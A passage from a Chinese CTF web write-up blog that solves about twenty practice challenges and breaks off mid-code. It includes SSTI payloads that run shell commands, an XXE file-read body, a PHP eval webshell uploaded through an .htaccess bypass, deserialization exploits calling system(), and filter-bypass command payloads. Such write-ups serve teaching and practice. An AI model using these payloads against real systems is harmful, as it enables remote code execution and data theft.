<p><code>Event.js -&gt; function mota -&gt; var a =[&#39;\x59...&#39;]</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#YUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5</span></span><br><span class="line"><span class="comment">#base64 decode -&gt; aGdhbWV7ZlVubnlKYXZhc2NyaXB0JkZ1bm55TTB0YUc0bWV9</span></span><br><span class="line"><span class="comment">#base64 decode -&gt; hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="115-NISACTF-2022-hardsql"><a href="#115-NISACTF-2022-hardsql" class="headerlink" title="115.[NISACTF 2022]hardsql"></a>115.[NISACTF 2022]hardsql</h1><p>Quine注入，详见75题，此处waf禁用了char，可使用chr和0x替换</p>
<p>char(34)&#x3D;chr(34)-&gt;0x22</p>
<p>char(39)&#x3D;chr(39)-&gt;0x27</p>
<h1 id="116-安洵杯-2020-Normal-SSTI"><a href="#116-安洵杯-2020-Normal-SSTI" class="headerlink" title="116.[安洵杯 2020]Normal SSTI"></a>116.[安洵杯 2020]Normal SSTI</h1><p>fenjing一把梭</p>
<h1 id="117-MoeCTF-2022-ezhtml"><a href="#117-MoeCTF-2022-ezhtml" class="headerlink" title="117.[MoeCTF 2022]ezhtml"></a>117.[MoeCTF 2022]ezhtml</h1><p>F12 evil.js</p>
<h1 id="118-SWPUCTF-2022-新生赛-funny-php"><a href="#118-SWPUCTF-2022-新生赛-funny-php" class="headerlink" title="118.[SWPUCTF 2022 新生赛]funny_php"></a>118.[SWPUCTF 2022 新生赛]funny_php</h1><p>使用数组绕过strlen，双写绕过正则置空，强碰撞字符串</p>
<p>payload:<code>GET传?num[]=1&amp;str=NSNSSCTFSCTF POST传 md5_1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;md5_2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p>
<h1 id="119-HNCTF-2022-WEEK2-ez-ssrf"><a href="#119-HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="119.[HNCTF 2022 WEEK2]ez_ssrf"></a>119.[HNCTF 2022 WEEK2]ez_ssrf</h1><p>ssrf，但是遇到个很想不明白的点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>b64结果是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogQ2xvc2UKCg==</span><br></pre></td></tr></table></figure>

<p>打过去是400，正确的结果应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=</span><br></pre></td></tr></table></figure>

<p>解出来是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而拿上面的复制进行b64</p>
<p>又得到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogQ2xvc2UKCgo=</span><br></pre></td></tr></table></figure>

<p>是真的离谱</p>
<h1 id="120-MoeCTF-2021-Web安全入门指北—小饼干"><a href="#120-MoeCTF-2021-Web安全入门指北—小饼干" class="headerlink" title="120.[MoeCTF 2021]Web安全入门指北—小饼干"></a>120.[MoeCTF 2021]Web安全入门指北—小饼干</h1><p>cookie的VIP改成1即可</p>
<h1 id="121-MoeCTF-2022-what-are-y0u-uploading？"><a href="#121-MoeCTF-2022-what-are-y0u-uploading？" class="headerlink" title="121.[MoeCTF 2022]what are y0u uploading？"></a>121.[MoeCTF 2022]what are y0u uploading？</h1><p>随便传个马抓包改文件名为f1ag.php直接返回flag</p>
<h1 id="122-MoeCTF-2021-2048"><a href="#122-MoeCTF-2021-2048" class="headerlink" title="122.[MoeCTF 2021]2048"></a>122.[MoeCTF 2021]2048</h1><p>f12看到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getFlag</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span><br><span class="line">  req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;flag.php?score=&quot;</span>+obj.<span class="property">score</span>,<span class="literal">true</span>);</span><br><span class="line">  req.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;flag.php?score&#x3D;999999</p>
<h1 id="123-UUCTF-2022-新生赛-ez-upload"><a href="#123-UUCTF-2022-新生赛-ez-upload" class="headerlink" title="123.[UUCTF 2022 新生赛]ez_upload"></a>123.[UUCTF 2022 新生赛]ez_upload</h1><p>apache的解析是从右往左解析的，上传改文件名为1.jpg.php即可</p>
<h1 id="124-极客大挑战-2020-welcome"><a href="#124-极客大挑战-2020-welcome" class="headerlink" title="124.[极客大挑战 2020]welcome"></a>124.[极客大挑战 2020]welcome</h1><p>post方法访问，数组绕过sha1比较，phpinfo的auto_prepend_file项有&#x2F;f1444aagggg.php路径，访问F12，flag在响应包头的flag项</p>
<h1 id="125-MoeCTF-2021-babyRCE"><a href="#125-MoeCTF-2021-babyRCE" class="headerlink" title="125.[MoeCTF 2021]babyRCE"></a>125.[MoeCTF 2021]babyRCE</h1><p>正则很强</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i</span><br></pre></td></tr></table></figure>

<p>没有过滤<code>\</code>和<code>?</code></p>
<p>payload:<code>ca\t$&#123;IFS&#125;f?ag.php</code></p>
<h1 id="126-SWPUCTF-2022-新生赛-ez-1zpop"><a href="#126-SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="126.[SWPUCTF 2022 新生赛]ez_1zpop"></a>126.[SWPUCTF 2022 新生赛]ez_1zpop</h1><p><code>QNKCDZO</code>和<code>240610708</code>用来在非传参时绕过md5弱比较</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;impo = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># O:2:&quot;lt&quot;:3:&#123;s:4:&quot;md51&quot;;s:7:&quot;QNKCDZO&quot;;s:4:&quot;md52&quot;;s:9:&quot;240610708&quot;;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment">#别忘了把lt后的3改成4绕过__wakeup()</span></span><br></pre></td></tr></table></figure>

<h1 id="127-MoeCTF-2022-ezphp"><a href="#127-MoeCTF-2022-ezphp" class="headerlink" title="127.[MoeCTF 2022]ezphp"></a>127.[MoeCTF 2022]ezphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GET传参处存在变量覆盖，POST没有，所以在get处传参，payload:<code>?a=flag&amp;flag=a</code></p>
<h1 id="128-HZNUCTF-2023-preliminary-flask"><a href="#128-HZNUCTF-2023-preliminary-flask" class="headerlink" title="128.[HZNUCTF 2023 preliminary]flask"></a>128.[HZNUCTF 2023 preliminary]flask</h1><p>payload需要倒序，焚靖的<code>--tamper-cmd rev</code>可以倒序，但仍然跑不出来</p>
<p><code>&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p>
<p><code>&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('env').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></p>
<p><code>&#123;% print lipsum.**globals**[‘os’].popen(‘env’).read() %&#125;</code>也可以</p>
<p>焚靖生成payload的用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;_&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s</span><br><span class="line">payload,_ = fenjing.exec_cmd_payload(waf, <span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h1 id="129-NCTF-2019-Fake-XML-cookbook"><a href="#129-NCTF-2019-Fake-XML-cookbook" class="headerlink" title="129.[NCTF 2019]Fake XML cookbook"></a>129.[NCTF 2019]Fake XML cookbook</h1><p>POST请求体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY  file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h1 id="130-UUCTF-2022-新生赛-ez-unser"><a href="#130-UUCTF-2022-新生赛-ez-unser" class="headerlink" title="130.[UUCTF 2022 新生赛]ez_unser"></a>130.[UUCTF 2022 新生赛]ez_unser</h1><p>需要注意的2个地方是</p>
<p>1、exp中也要把方法补上 否则将不会执行</p>
<p>2、由于正则不允许修改序列化成员数量绕过<code>__wakeup</code>，但可以通过赋予变量相同的地址<code>$a-&gt;b=&amp;$a-&gt;a;</code></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>第一版exp（无法执行，因为<code>__wakeup</code>和<code>__destruct</code>没有补全）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="131-SWPUCTF-2022-新生赛-Ez-upload"><a href="#131-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="131.[SWPUCTF 2022 新生赛]Ez_upload"></a>131.[SWPUCTF 2022 新生赛]Ez_upload</h1><p>上传<code>.htaccess</code>，修改mime类型为<code>image/jpeg</code>即可</p>
<p><img src="/images/image-20231115141605923.png" alt="image-20231115141605923"></p>
<p>然后传马，waf是ph*和mime类型，以及&lt;?</p>
<p>所以改用<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code>，修改mime类型为<code>image/jpeg</code>，使用文件后缀为png(其实任意都可以，因为.htaccess已经将所有后缀的文件都解析为php了)</p>
<p><img src="/images/image-20231115145056553.png" alt="image-20231115145056553"></p>
<p>蚁剑连接没啥用，flag在phpinfo里</p>
<h1 id="132-FSCTF-2023-源码！启动"><a href="#132-FSCTF-2023-源码！启动" class="headerlink" title="132.[FSCTF 2023]源码！启动!"></a>132.[FSCTF 2023]源码！启动!</h1><p>F12被禁用，ctrl+U在最下面getflag</p>
<h1 id="133-SWPUCTF-2022-新生赛-funny-web"><a href="#133-SWPUCTF-2022-新生赛-funny-web" class="headerlink" title="133.[SWPUCTF 2022 新生赛]funny_web"></a>133.[SWPUCTF 2022 新生赛]funny_web</h1><p>username&#x3D;NSS</p>
<p>password&#x3D;2122693401</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rea11y.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这为何相等又不相等&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?num=12345a</code></p>
<h1 id="134-MoeCTF-2021-Web安全入门指北—GET"><a href="#134-MoeCTF-2021-Web安全入门指北—GET" class="headerlink" title="134.[MoeCTF 2021]Web安全入门指北—GET"></a>134.[MoeCTF 2021]Web安全入门指北—GET</h1><p><code>?moe=flag</code></p>
<h1 id="135-MoeCTF-2021-unserialize"><a href="#135-MoeCTF-2021-unserialize" class="headerlink" title="135.[MoeCTF 2021]unserialize"></a>135.[MoeCTF 2021]unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 